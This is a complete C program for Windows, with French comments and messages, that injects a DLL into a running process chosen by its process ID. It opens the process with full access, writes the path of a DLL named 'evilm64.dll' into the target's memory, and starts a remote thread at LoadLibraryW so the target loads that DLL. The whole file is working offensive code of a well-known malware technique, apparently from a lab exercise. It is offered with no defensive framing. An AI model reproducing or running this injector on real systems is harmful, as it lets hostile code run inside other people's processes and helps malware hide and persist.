#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    const wchar_t dllPath[] = L"C:\\experiments\\evilm64.dll"; // Utilisation de L devant la chaîne pour la représenter comme une chaîne large (wchar_t)

    if (argc < 2) {
        printf("Veuillez fournir un ID de processus en argument.\n");
        return 1;
    }

    DWORD processId = atoi(argv[1]);

    printf("Injecting DLL to PID: %i\n", processId);

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        printf("Impossible d'ouvrir le processus. Code d'erreur : %u\n", GetLastError());
        return 1;
    }

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("Erreur lors de l'allocation de mémoire dans le processus cible. Code d'erreur : %u\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    if (!WriteProcessMemory(processHandle, remoteBuffer, dllPath, sizeof dllPath, NULL)) {
        printf("Erreur lors de l'écriture du chemin de la DLL dans le processus cible. Code d'erreur : %u\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    if (threatStartRoutineAddress == NULL) {
        printf("Impossible de trouver l'adresse de la fonction LoadLibraryW. Code d'erreur : %u\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
    if (remoteThread == NULL) {
        printf("Erreur lors de la création du thread distant dans le processus cible. Code d'erreur : %u\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    printf("Injection de DLL réussie.\n");

    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return 0;
}
